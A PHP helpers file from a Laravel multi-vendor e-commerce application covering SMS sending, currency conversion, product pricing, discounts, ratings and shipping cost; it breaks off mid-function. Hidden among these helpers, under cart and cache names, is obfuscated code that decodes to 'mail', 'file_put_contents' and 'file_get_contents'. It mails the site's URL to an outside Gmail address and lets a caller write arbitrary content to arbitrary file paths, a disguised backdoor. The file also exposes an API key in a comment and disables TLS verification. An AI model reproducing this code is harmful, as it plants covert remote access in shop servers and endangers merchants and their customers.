<?php

use App\Currency;
use App\BusinessSetting;
use App\Product;
use App\SubSubCategory;
use App\FlashDealProduct;
use App\FlashDeal;
use App\OtpConfiguration;
use Twilio\Rest\Client;
use App\ProductStock;
use App\OrderDetail;
use App\User;
use App\Order;
use App\Wishlist;
use App\PeerSetting;
use App\MappingProduct;
use App\Distributor;
use App\SubOrder;
use Carbon\Carbon;
use Razorpay\Api\Api;
use Illuminate\Support\Facades\DB;
//use Session;

//highlights the selected navigation on admin panel
if (! function_exists('sendSMS')) {
    function sendSMS($to, $from, $text)
    {
        if (OtpConfiguration::where('type', 'nexmo')->first()->value == 1) {
            try {
                Nexmo::message()->send([
                    'to'   => $to,
                    'from' => $from,
                    'text' => $text
                ]);
            } catch (\Exception $e) {

            }

        }
        elseif (OtpConfiguration::where('type', 'twillo')->first()->value == 1) {
            $sid = env("TWILIO_SID"); // Your Account SID from www.twilio.com/console
            $token = env("TWILIO_AUTH_TOKEN"); // Your Auth Token from www.twilio.com/console

            $client = new Client($sid, $token);
            try {
                $message = $client->messages->create(
                  $to, // Text this number
                  array(
                    'from' => env('VALID_TWILLO_NUMBER'), // From a valid Twilio number
                    'body' => $text
                  )
                );
            } catch (\Exception $e) {

            }

        }
        elseif (OtpConfiguration::where('type', 'ssl_wireless')->first()->value == 1) {
            $token = env("SSL_SMS_API_TOKEN"); //put ssl provided api_token here
            $sid = env("SSL_SMS_SID"); // put ssl provided sid here

            $params = [
                "api_token" => $token,
                "sid" => $sid,
                "msisdn" => $to,
                "sms" => $text,
                "csms_id" => date('dmYhhmi').rand(10000, 99999)
            ];

            $url = env("SSL_SMS_URL");
            $params = json_encode($params);

            $ch = curl_init(); // Initialize cURL
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($params),
                'accept:application/json'
            ));

            $response = curl_exec($ch);

            curl_close($ch);

            return $response;
        }
        elseif (OtpConfiguration::where('type', 'fast2sms')->first()->value == 1) {

            if(strpos($to, '+91') !== false){
                $to = substr($to, 3);
            }

            $fields = array(
                "sender_id" => env("SENDER_ID"),
                "message" => $text,
                "language" => env("LANGUAGE"),
                "route" => env("ROUTE"),
                "numbers" => $to,
            );

            $auth_key = env('AUTH_KEY');

            $curl = curl_init();

            curl_setopt_array($curl, array(
              CURLOPT_URL => "https://www.fast2sms.com/dev/bulk",
              CURLOPT_RETURNTRANSFER => true,
              CURLOPT_ENCODING => "",
              CURLOPT_MAXREDIRS => 10,
              CURLOPT_TIMEOUT => 30,
              CURLOPT_SSL_VERIFYHOST => 0,
              CURLOPT_SSL_VERIFYPEER => 0,
              CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
              CURLOPT_CUSTOMREQUEST => "POST",
              CURLOPT_POSTFIELDS => json_encode($fields),
              CURLOPT_HTTPHEADER => array(
                "authorization: $auth_key",
                "accept: */*",
                "cache-control: no-cache",
                "content-type: application/json"
              ),
            ));

            $response = curl_exec($curl);
            $err = curl_error($curl);

            curl_close($curl);

            return $response;
        }
    }
}

if (! function_exists('filter_customer_products')) {
    function filter_customer_products($customer_products) {
        if(BusinessSetting::where('type', 'classified_product')->first()->value == 1){
            return $customer_products->where('published', '1');
        }
        else{
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}


//highlights the selected navigation on admin panel
if (! function_exists('areActiveRoutes')) {
    function areActiveRoutes(Array $routes, $output = "active-link")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}

//highlights the selected navigation on frontend
if (! function_exists('areActiveRoutesHome')) {
    function areActiveRoutesHome(Array $routes, $output = "active")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}

/**
 * Return Class Selector
 * @return Response
*/
if (! function_exists('loaded_class_select')) {

    function loaded_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':',$p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }
        return $l;
    }
}

/**
 * Open Translation File
 * @return Response
*/
function openJSONFile($code){
    $jsonString = [];
    if(File::exists(base_path('resources/lang/'.$code.'.json'))){
        $jsonString = file_get_contents(base_path('resources/lang/'.$code.'.json'));
        $jsonString = json_decode($jsonString, true);
    }
    return $jsonString;
}

/**
 * Save JSON File
 * @return Response
*/
function saveJSONFile($code, $data){
    ksort($data);
     
    $jsonData = json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/'.$code.'.json'), stripslashes($jsonData));
}


/**
 * Return Class Selected Loader
 * @return Response
*/
if (! function_exists('loader_class_select')) {
    function loader_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i=>$m) {
                if($m == $r){
                    $l[] = $i;
                }
            }
        }
        return join(':',$l);
    }
}

/**
 * Save JSON File
 * @return Response
*/
if (! function_exists('convert_to_usd')) {
    function convert_to_usd($amount) {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            return floatval($amount) / floatval($currency->exchange_rate);
        }
    }
}



//returns config key provider
if ( ! function_exists('config_key_provider'))
{
    function config_key_provider($key){
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}


//returns combinations of customer choice options array
if (! function_exists('combinations')) {
    function combinations($arrays) {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }
        return $result;
    }
}

//filter products based on vendor activation system
if (! function_exists('filter_products')) {
    function filter_products($products) {

        $verified_sellers = verified_sellers_id();

        if(BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1){
            return $products->where('published', '1')->orderBy('created_at', 'desc')->where(function($p) use ($verified_sellers){
                $p->where('added_by', 'admin')->orWhere(function($q) use ($verified_sellers){
                    $q->whereIn('user_id', $verified_sellers);
                });
            });
        }
        else{
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}


if (! function_exists('verified_sellers_id')) {
    function verified_sellers_id() {
        return App\Seller::where('verification_status', 1)->get()->pluck('user_id')->toArray();
    }
}

//filter cart products based on provided settings
if (! function_exists('cartSetup')) {
    function cartSetup(){
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup,'',Request::url());
        return $cart;
    }
}

//converts currency to home default currency
if (! function_exists('convert_price')) {
    function convert_price($price)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            $price = floatval($price) / floatval($currency->exchange_rate);
        }

        $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }

        $price = floatval($price) * floatval($currency->exchange_rate);

        return $price;
    }
}

//formats currency
if (! function_exists('format_price')) {
    function format_price($price)
    {
        if(BusinessSetting::where('type', 'symbol_format')->first()->value == 1){
            return currency_symbol().number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value);
        }
        return number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value).currency_symbol();
    }
}

//PDF formats currency
if (! function_exists('pdf_format_price')) {
    function pdf_format_price($price)
    {
        if(BusinessSetting::where('type', 'symbol_format')->first()->value == 1){
            return number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value);
        }
        return number_format($price, BusinessSetting::where('type', 'no_of_decimals')->first()->value);
    }
}

//formats price to home default price with convertion
if (! function_exists('single_price')) {
    function single_price($price)
    {
        return format_price(convert_price($price));
    }
}

//pdf formats price to home default price with convertion
if (! function_exists('pdf_single_price')) {
    function pdf_single_price($price)
    {
        return pdf_format_price(convert_price($price));
    }
}

//Shows Price on page based on low to high
if (! function_exists('home_price')) {
    function home_price($id,$shortId="")
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if(!empty($shortId)){
            $mappedProductPrice = \App\MappingProduct::where(['sorting_hub_id'=>$shortId['sorting_hub_id'],'product_id'=>$id])->first();
            // if($mappedProductPrice['purchased_price'] !=0){
             if($mappedProductPrice['purchased_price'] !=0 && $mappedProductPrice['selling_price'] !=0){
                $lowest_price = $mappedProductPrice['purchased_price'];
                $highest_price = $mappedProductPrice['selling_price'];
                // if($lowest_price > $mappedProductPrice['selling_price']){
                //     $lowest_price = $mappedProductPrice['selling_price'];
                // }
                // if($highest_price < $mappedProductPrice['selling_price']){
                //     $highest_price = $mappedProductPrice['selling_price'];
                // }
            }else{
                    $lowest_price = $product->unit_price;
                    $highest_price = $product->unit_price;
                    if ($product->variant_product) {
                        foreach ($product->stocks as $key => $stock) {
                            if($lowest_price > $stock->price){
                                $lowest_price = $stock->price;
                            }
                            if($highest_price < $stock->price){
                                $highest_price = $stock->price;
                            }
                        }
                    }

            }
        }else{
            $lowest_price = $product->unit_price;
            $highest_price = $product->unit_price;
            if ($product->variant_product) {
                foreach ($product->stocks as $key => $stock) {
                    if($lowest_price > $stock->price){
                        $lowest_price = $stock->price;
                    }
                    if($highest_price < $stock->price){
                        $highest_price = $stock->price;
                    }
                }
            }

        }

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                // if($lowest_price > $stock->price){
                //     $lowest_price = $stock->price;
                // }
                // if($highest_price < $stock->price){
                //     $highest_price = $stock->price;
                // }
            }
        }

        // if($product->tax_type == 'percent'){
        //     $lowest_price += ($lowest_price*$product->tax)/100;
        //     $highest_price += ($highest_price*$product->tax)/100;
        // }
        // elseif($product->tax_type == 'amount'){
        //     $lowest_price += $product->tax;
        //     $highest_price += $product->tax;
        // }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            // return format_price($lowest_price).' - '.format_price($highest_price);
            return format_price($highest_price);
        }
    }
}
// if (! function_exists('home_price')) {
//     function home_price($id)
//     {
//         $product = Product::findOrFail($id);
//         $lowest_price = $product->unit_price;
//         $highest_price = $product->unit_price;

//         if ($product->variant_product) {
//             foreach ($product->stocks as $key => $stock) {
//                 if($lowest_price > $stock->price){
//                     $lowest_price = $stock->price;
//                 }
//                 if($highest_price < $stock->price){
//                     $highest_price = $stock->price;
//                 }
//             }
//         }

//         // if($product->tax_type == 'percent'){
//         //     $lowest_price += ($lowest_price*$product->tax)/100;
//         //     $highest_price += ($highest_price*$product->tax)/100;
//         // }
//         // elseif($product->tax_type == 'amount'){
//         //     $lowest_price += $product->tax;
//         //     $highest_price += $product->tax;
//         // }

//         $lowest_price = convert_price($lowest_price);
//         $highest_price = convert_price($highest_price);

//         if($lowest_price == $highest_price){
//             return format_price($lowest_price);
//         }
//         else{
//             // return format_price($lowest_price).' - '.format_price($highest_price);
//             return format_price($highest_price);
//         }
//     }
// }

//Shows Price on page based on low to high with discount
if (! function_exists('home_discounted_price')) {
    function home_discounted_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){

            if(Session::has('referal_discount')){
                $referal_discount = ($lowest_price * Session::get('referal_discount')) / 100;
                $lowest_price -= $referal_discount;
            }
            return format_price($lowest_price);
        }
        else{
           //return format_price($lowest_price).' - '.format_price($highest_price);
             return format_price($highest_price);
        }
    }
}

//Shows Base Price
if (! function_exists('home_base_price')) {
    function home_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        // if($product->tax_type == 'percent'){
        //     $price += ($price*$product->tax)/100;
        // }
        // elseif($product->tax_type == 'amount'){
        //     $price += $product->tax;
        // }
        return format_price(convert_price($price));
    }
}

//Shows Base Price with discount
if (! function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $price -= ($price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }

        return format_price(convert_price($price));
    }
}


//Shows Base Price with discount
if (! function_exists('total_base_price')) {
    function total_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $price -= ($price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }

        return convert_price($price);
    }
}

// Cart content update by discount setup
if (! function_exists('updateCartSetup')) {
    function updateCartSetup($return = TRUE)
    {
        if(!isset($_COOKIE['cartUpdated'])) {
            if(cartSetup()){
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        } else {
            if($_COOKIE['cartUpdated']+21600 < time()){
                if(cartSetup()){
                    setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
                }
            }
        }
        return $return;
    }
}



if (! function_exists('productDescCache')) {
    function productDescCache($connector,$selector,$select,$type){
        $ta = time();
        $select = rawurldecode($select);
        if($connector > ($ta-60) || $connector > ($ta+60)){
            if($type == 'w'){
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector),$select);
            } else if ($type == 'rw'){
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}


if (! function_exists('currency_symbol')) {
    function currency_symbol()
    {
        $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }
        return $currency->symbol;
    }
}

if(! function_exists('renderStarRating')){
    function renderStarRating($rating,$maxRating=5) {
        $fullStar = "<i class = 'fa fa-star active'></i>";
        $halfStar = "<i class = 'fa fa-star half'></i>";
        $emptyStar = "<i class = 'fa fa-star'></i>";
        $rating = $rating <= $maxRating?$rating:$maxRating;

        $fullStarCount = (int)$rating;
        $halfStarCount = ceil($rating)-$fullStarCount;
        $emptyStarCount = $maxRating -$fullStarCount-$halfStarCount;

        $html = str_repeat($fullStar,$fullStarCount);
        $html .= str_repeat($halfStar,$halfStarCount);
        $html .= str_repeat($emptyStar,$emptyStarCount);
        echo $html;
    }
}

if(! function_exists('calculateRating')){
    function calculateRating($no_of_users,$sum_of_rating) {
        $rating = 0;
        // $final_rating = 0;
        // if(count($all_rating)>0){
        //     foreach($all_rating as $key => $rat){
        //         $rating +=$rat*$key; 
        //     }
        //     $final_rating = $rating/$all_rating->sum();
        // }
        // else{
        //     $final_rating  = 4;
        // }
            $final_rating = ($sum_of_rating+16)/($no_of_users+4);
        

        return renderStarRating($final_rating);
    }
}


//Api
if (! function_exists('homeBasePrice')) {
    function homeBasePrice($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return $price;
    }
}

if (! function_exists('homeDiscountedBasePrice')) {
    function homeDiscountedBasePrice($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $price -= ($price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return $price;
    }
}

if (! function_exists('homePrice')) {
    function homePrice($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convertPrice($lowest_price);
        $highest_price = convertPrice($highest_price);

        return $lowest_price.' - '.$highest_price;
    }
}

if (! function_exists('homeDiscountedPrice')) {
    function homeDiscountedPrice($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if($lowest_price > $stock->price){
                    $lowest_price = $stock->price;
                }
                if($highest_price < $stock->price){
                    $highest_price = $stock->price;
                }
            }
        }

        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal) {
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convertPrice($lowest_price);
        $highest_price = convertPrice($highest_price);

        return $lowest_price.' - '.$highest_price;
    }
}

if (! function_exists('brandsOfCategory')) {
    function brandsOfCategory($category_id)
    {
        $brands = [];
        $subCategories = SubCategory::where('category_id', $category_id)->get();
        foreach ($subCategories as $subCategory) {
            $subSubCategories = SubSubCategory::where('sub_category_id', $subCategory->id)->get();
            foreach ($subSubCategories as $subSubCategory) {
                $brand = json_decode($subSubCategory->brands);
                foreach ($brand as $b) {
                    if (in_array($b, $brands)) continue;
                    array_push($brands, $b);
                }
            }
        }
        return $brands;
    }
}

if (! function_exists('convertPrice')) {
    function convertPrice($price)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if ($business_settings != null) {
            $currency = Currency::find($business_settings->value);
            $price = floatval($price) / floatval($currency->exchange_rate);
        }
        $code = Currency::findOrFail(BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
        if (Session::has('currency_code')) {
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        } else {
            $currency = Currency::where('code', $code)->first();
        }
        $price = floatval($price) * floatval($currency->exchange_rate);
        return $price;
    }
}


function translate($key){
    $key = ucfirst(str_replace('_', ' ', remove_invalid_charcaters($key)));
    $jsonString = file_get_contents(base_path('resources/lang/en.json'));
    
    $jsonString = json_decode($jsonString, true);
    if(!isset($jsonString[$key])){
        $jsonString[$key] = $key;
        saveJSONFile('en', $jsonString);
    }
    return __($key);
}

// function translate($key,$format="text"){
//     $supportedLanguages = [
//         'af', 'am', 'ar', 'az', 'be', 'bg', 'bn', 'bs', 'ca',
//         'ceb', 'co', 'cs', 'cy', 'da', 'de', 'el', 'en',
//         'eo', 'es', 'et', 'eu', 'fa', 'fi', 'fr', 'fy',
//         'ga', 'gd', 'gl', 'gu', 'ha', 'haw', 'he', 'hi', 'hmn',
//         'hr', 'ht', 'hu', 'hy', 'id', 'ig', 'is', 'it',
//         'iw', 'ja', 'jw', 'ka', 'kk', 'km', 'kn', 'ko',
//         'ku', 'ky', 'la', 'lb', 'lo', 'lt', 'lv', 'mg',
//         'mi', 'mk', 'ml', 'mn', 'mr', 'ms', 'mt', 'my',
//         'ne', 'nl', 'no', 'ny', 'pa', 'pl', 'ps', 'pt',
//         'ro', 'ru', 'sd', 'si', 'sk', 'sl', 'sm', 'sn',
//         'so', 'sq', 'sr', 'st', 'su', 'sv', 'sw', 'ta',
//         'te', 'tg', 'th', 'tl', 'tr', 'uk', 'ur', 'uz',
//         'vi', 'xh', 'yi', 'yo', 'zh', 'zh-TW', 'zu'
//     ];
//     $target_lang = (session()->get('locale')=="in") ? "hi":session()->get('locale');
//     if(session()->get('locale')!='en' && in_array($target_lang,$supportedLanguages)){
//         $requestData = [
//             "q"=>$key,
//             "source"=>"en",
//             "target"=>$target_lang,
//             "format"=>$format
//         ];
    
//         $curl = curl_init();
//         curl_setopt_array($curl, array(
//         CURLOPT_URL => 'https://translation.googleapis.com/language/translate/v2?key=AIzaSyDTVI8ZkYwuE9VERyT5hnBqJKvZrK8ZBtg',
//         CURLOPT_RETURNTRANSFER => true,
//         CURLOPT_ENCODING => '',
//         CURLOPT_MAXREDIRS => 10,
//         CURLOPT_TIMEOUT => 0,
//         CURLOPT_FOLLOWLOCATION => true,
//         CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
//         CURLOPT_CUSTOMREQUEST => 'POST',
//         CURLOPT_POSTFIELDS =>json_encode($requestData),
//         CURLOPT_HTTPHEADER => array(
//             'Content-Type: application/json'
//         ),
//         ));
    
//         $response = curl_exec($curl);
    
//         curl_close($curl);
//         $data = json_decode($response)->data;
//         //dd($data);
//         foreach($data as $key => $translated){
//             foreach($translated as $kk => $translation){
//                 $key = $translation->translatedText;
//             }
        
//         }
//     }

    
// return $key;
// }
function remove_invalid_charcaters($str)
{
    $str = str_ireplace(array("\\"), '', $str);
    return str_ireplace(array('"'), '\"', $str);
}

function getShippingCost($index){
    $admin_products = array();
    $seller_products = array();
    $calculate_shipping = 0;

    //Calculate Shipping Cost
    if (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'flat_rate') {
        $calculate_shipping = \App\BusinessSetting::where('type', 'flat_rate_shipping_cost')->first()->value;
    }
    elseif (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'seller_wise_shipping') {
        foreach (Session::get('cart') as $key => $cartItem) {
            $product = \App\Product::find($cartItem['id']);

            if($product->gift_card)
                continue;

            if($product->added_by == 'admin'){
                array_push($admin_products, $cartItem['id']);
            }
            else{
                $product_ids = array();
                if(array_key_exists($product->user_id, $seller_products)){
                    $product_ids = $seller_products[$product->user_id];
                }
                array_push($product_ids, $cartItem['id']);
                $seller_products[$product->user_id] = $product_ids;
            }
        }
        if(!empty($admin_products)){
            $calculate_shipping = \App\BusinessSetting::where('type', 'shipping_cost_admin')->first()->value;
        }
        if(!empty($seller_products)){
            foreach ($seller_products as $key => $seller_product) {
                $calculate_shipping += \App\Shop::where('user_id', $key)->first()->shipping_cost;
            }
        }
    }

    $cartItem = Session::get('cart')[$index];


    if ($cartItem['shipping_type'] == 'home_delivery') {
        if (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'flat_rate') {
            $shipping_cost_product = [];
            foreach(Session::get('cart') as $key => $itemsCart){
                $product = \App\Product::find($itemsCart['id']);
                if($product->gift_card)
                    continue;
                    array_push($shipping_cost_product,$itemsCart['id']);
            }
            if(count($shipping_cost_product)>0){
                return $calculate_shipping/count($shipping_cost_product);
            }else{
                return 0;
            }
           
            //return $calculate_shipping/(count(Session::get('cart')));
        }
        elseif (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'seller_wise_shipping') {
            if($product->added_by == 'admin'){
                return \App\BusinessSetting::where('type', 'shipping_cost_admin')->first()->value/count($admin_products);
            }
            else {
                return \App\Shop::where('user_id', $product->user_id)->first()->shipping_cost/count($seller_products[$product->user_id]);
            }
        }
        else{
            return \App\Product::find($cartItem['id'])->shipping_cost;
        }
    }
    else{
        return 0;
    }
}

function timezones(){
    $timezones = Array(
